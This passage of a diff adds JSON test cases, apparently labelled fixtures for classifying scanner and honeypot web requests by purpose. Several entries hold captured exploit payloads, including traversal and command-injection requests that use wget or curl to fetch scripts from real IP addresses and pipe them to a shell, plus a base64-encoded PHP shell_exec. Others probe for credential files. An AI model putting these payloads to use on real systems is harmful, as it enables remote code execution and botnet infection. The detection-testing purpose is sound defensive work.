+    "path": "/?redirect=http://testdomain.com",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
+    "body": "",
+    "expected_purpose": "open_redirect",
+    "expected_name": "Generic Open Redirect Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/debug/default/view?panel=config",
+    "ua": "Mozilla/5.0 (Linux; U; Android 2.3.6; en-gb; LG-E400 Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 MMS/LG-Android-MMS-V1.2",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Yii2 Debug Panel Config Disclosure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/druid/index.html",
+    "ua": "Mozilla/5.0 zgrab/0.x",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Alibaba Druid Dashboard Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/hudson",
+    "ua": "Mozilla/5.0 zgrab/0.x",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "Jenkins / Hudson Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/portal/redlion",
+    "ua": "Mozilla/5.0 zgrab/0.x",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "RedLion Crimson Portal"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/aab9",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "IoT Botnet Probe (aad7, aab9, Dr0v)"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "GET",
+    "path": "/zhnping.html",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "Hikvision ZhingPing Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/app_dev.php/_profiler/.env",
+    "ua": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Symfony Profiler Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/.git/config",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Git Metadata Exposure"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "GET",
+    "path": "/api.ipify.org/check",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "api_probe",
+    "expected_name": "IPify Reconnaissance Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/_next/static/",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "Next.js Application Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/sse",
+    "ua": "python-httpx/0.28.1",
+    "body": "",
+    "expected_purpose": "api_probe",
+    "expected_name": "Model Context Protocol (MCP) Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "SSTP_DUPLEX_POST",
+    "path": "/sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "Microsoft SSTP VPN Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/wp-json/oembed/1.0/proxy",
+    "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+    "body": "",
+    "expected_purpose": "proxy_abuse",
+    "expected_name": "WordPress oEmbed SSRF Proxy"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application",
+    "ua": "Mozilla/5.0 zgrab/0.x",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "Microsoft Exchange eDiscovery Reconnaissance"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "POST",
+    "path": "/sdk",
+    "ua": "VMware-client/6.0",
+    "body": "<RetrieveServiceContent/>",
+    "expected_purpose": "app_discovery",
+    "expected_name": "VMware vCenter / ESXi Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/server-status",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Apache mod_status Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "{\"ID\":",
+    "path": "1,",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "Hajime / IoT Botnet '1,' Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/systembc/password.php",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
+    "body": "",
+    "expected_purpose": "malware_comm",
+    "expected_name": "SystemBC Malware Communication"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "stager64",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
+    "body": "",
+    "expected_purpose": "malware_comm",
+    "expected_name": "Metasploit / Cobalt Strike Stager Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/RDWeb/Pages/",
+    "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "Microsoft RDWeb Login Brute Force"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/sonicui/7/sslvpn-portal/",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "SonicWall SSL-VPN Portal Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/vsm3/",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "D-Link Central Wi-Fi Manager (vsm3)"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/aspera/faspex/",
+    "ua": "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "IBM Aspera Faspex RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/onvif/device_service",
+    "ua": "Go-http-client/1.1",
+    "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><env:Envelope xmlns:env=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:tds=\"http://www.onvif.org/ver10/device/wsdl\"><env:Body><tds:GetDeviceInformation/></env:Bo",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "ONVIF IoT Device Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/admin/cdr/config.all.php?x",
+    "ua": "Mozilla/5.0",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "Cisco Unified Communications Manager (CDR) Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/pandora_console/",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "Pandora FMS Console Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/kylin/",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "Apache Kylin Administrative Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/global-protect/login.esp",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "Palo Alto GlobalProtect Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh",
+    "ua": "libredtail-http",
+    "body": "(wget --no-check-certificate -qO- https://14.46.136.77/sh || curl -sk https://14.46.136.77/sh) | sh -s apache.selfrep",
+    "expected_purpose": "rce",
+    "expected_name": "Apache HTTP Server Path Traversal RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
+    "ua": "libredtail-http",
+    "body": "<?php shell_exec(base64_decode(\"KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMTQuNDYuMTM2Ljc3L3NoIHx8IGN1cmwgLXNrIGh0dHBzOi8vMTQuNDYuMTM2Ljc3L3NoKSB8IHNoIC1zIGN2ZV8yMDI0XzQ1Nzcuc2VsZnJlcA==",
+    "expected_purpose": "rce",
+    "expected_name": "PHP CGI Argument Injection"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/actuator/gateway/routes",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "Spring Cloud Gateway RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh)",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "TP-Link LuCI Command Injection"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F85.239.151.41%2Fthk%3B+chmod+777+thk%3B+.%2Fthk",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "Realtek SDK RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/goform/AdvSetMacMtuWan",
+    "ua": "Go-http-client/1.1",
+    "body": "wanMTU=%3Bping%20-c%201%20156.246.93.156%3B",
+    "expected_purpose": "rce",
+    "expected_name": "Tenda Router Command Injection"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/ssdpcgi",
+    "ua": "Go-http-client/1.1",
+    "body": "<?xml version=\"1.0\"?><service><type>uuid:;chmod 777 /bin/wget;chmod 777 /bin/curl; wget http://103.31.39.234/wawan.sh -O wawan.sh;chmod 777 wawan.sh;./wawan.sh;rm -rf wawan.sh;history -c;</type></serv",
+    "expected_purpose": "rce",
+    "expected_name": "SSDP CGI Command Injection"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "HEAD",
+    "path": "/web-console/ServerInfo.jsp",
+    "ua": "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "JBoss JMX Console Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php",
+    "ua": "libredtail-http",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "PHP PEAR Config Create RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/../../../../etc/passwd",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Directory Traversal (etc/passwd)"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/board.cgi?cmd=chmod",
+    "ua": "Go-http-client/1.1",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "Router CGI Command Injection"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/ueditor/jsp/controller.jsp?action=catchimage&source[]=http://127.0.0.1:515449/?1.png",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
+    "body": "",
+    "expected_purpose": "proxy_abuse",
+    "expected_name": "UEditor SSRF"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/api/v2/json-rpc",
+    "ua": "python-requests/2.28.1",
+    "body": "{\"jsonrpc\": \"2.0\", \"method\": \"module.search\", \"id\": 1, \"params\": [\"psexec author:egypt arch:x64\"]}",
+    "expected_purpose": "api_probe",
+    "expected_name": "Metasploit RPC Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/",
+    "ua": "ivre-masscan/1.3 https://github.com/robertdavidgraham/",
+    "body": "",
+    "expected_purpose": "research_scanner",
+    "expected_name": "IVRE Scanner"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "GET",
+    "path": "/__vite_ping",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "Vite Dev Server Probe"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "GET",
+    "path": "/SQLiteManager/",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "SQLiteManager Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/application.properties",
+    "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.42 Safari/537.36",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Spring Boot Config Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/dump.sql",
+    "ua": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Exposed SQL Dump"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "GET",
+    "path": "/config/robomongo.json",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "RoboMongo Config Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "CONNECT",
+    "path": "www.google.com:443",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "body": "",
+    "expected_purpose": "proxy_abuse",
+    "expected_name": "HTTP CONNECT Proxy Abuse"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "T3",
+    "path": "12.1.2",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "Oracle WebLogic T3 RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "FOX",
+    "path": "a",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "Tridium Niagara FOX Protocol Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "27;WGET%20HTTP://%S:%D/MOZI.M%20-O%20->%20/TMP/MOZI.M;CHMOD%20777%20/TMP/MOZI.M;/TMP/MOZI.M%20DLINK.MIPS%27$",
+    "path": "HTTP/1.0",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "Mozi Botnet D-Link HTTP Method Injection"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "GET",
+    "path": "/owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "OwnCloud GraphAPI Info Disclosure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/cslu/v1/core/conf",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Cisco CSLU Config Disclosure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/versa/login",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "Versa Director Authentication Bypass"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/CFIDE/componentutils/",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "Adobe ColdFusion Admin Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/nifi/",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "Apache NiFi Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/dana-cached/hc/HostCheckerInstaller.osx",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "Ivanti Connect Secure Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/ignite?cmd=version",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "Apache Ignite RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/administrator/manifests/files/joomla.xml",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "Joomla CMS Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/ISAPI/Streaming/channels/101/picture",
+    "ua": "python-requests/2.31.0",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "Hikvision Camera Stream Access"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/IPCamDesc.xml",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "ONVIF Camera Snapshot Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/metrics",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Prometheus Metrics Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/_matrix/identity/v2",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "Matrix Homeserver Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/confluence/rest/applinks/1.0/manifest",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "Atlassian Application Links Discovery"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "POST",
+    "path": "/ipp",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "IPP Printer Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/cgi-bin/luci/",
+    "ua": "Mozilla/5.0",
+    "body": "luci_username=root&luci_password=Aa123123@",
+    "expected_purpose": "credential_theft",
+    "expected_name": "OpenWrt LuCI Credential Brute Force"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/.DS_Store",
+    "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "DS_Store File Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/env.json",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "JavaScript Env Config Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/app/config/parameters.yml",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Rails/Symfony Database Config Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/ecosystem.config.js",
+    "ua": "Mozilla/5.0 (compatible; silver.inc/2.0)",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "PM2 Ecosystem Config Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/sendgrid.env",
+    "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Email API Credentials Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/.aws/credentials",
+    "ua": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "AWS Config Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/client_secrets.json",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Connection Config Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/config.yaml",
+    "ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Generic Root Config File Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/",
+    "ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",
+    "body": "0x%5B%5D=androxgh0st",
+    "expected_purpose": "credential_theft",
+    "expected_name": "AndroxGh0st"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/",
+    "ua": "visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36",
+    "body": "",
+    "expected_purpose": "research_scanner",
+    "expected_name": "VisionHeight Scanner"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/terraform.tfvars.json",
+    "ua": "l9explore/1.2.2",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Terraform State/Variables Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/firebase-adminsdk.json",
+    "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Cloud Service Account Key Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/.config/gcloud/credentials.db",
+    "ua": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36 OPR/28.0.1750.40",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "GCloud Application Default Credentials"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/backend/appsettings.json",
+    "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "ASP.NET Core AppSettings Environment Variants"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/config/master.key",
+    "ua": "Mozilla/5.0 (compatible; silver.inc/2.0)",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Rails Master Key Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/serverless.yaml",
+    "ua": "l9explore/1.2.2",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Serverless Framework Config Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/.flaskenv",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Flask Environment Config Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/.secrets",
+    "ua": "Mozilla/5.0 (compatible; silver.inc/2.0)",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Hidden Secrets File Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/hibernate.cfg.xml",
+    "ua": "Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.6) Gecko/20040207 Firefox/0.8",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Hibernate Database Config Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/storage/logs/laravel.log",
+    "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.31 (KHTML like Gecko) Chrome/26.0.1410.63 Safari/537.31",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Laravel Application Log Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/restapps/applications.php?linestate=$$LINESTATE$$&user=100%0AContext%3A%20ext-local%0A%0AAction%3A%20Originate%0AChannel%3A%20Local%2F555%40app-chanspy%0AApplication%3A%20system%0Adata%3A%20wget%20http%3A%2F%2F160.119.69.4%2Fk.php%20-O%20%2Fvar%2Fspool%2Fasterisk%2Ftmp%2Fk%3Bbash%20%2Fvar%2Fspool%2Fasterisk%2Ftmp%2Fk%0A%0A%0A%0A",
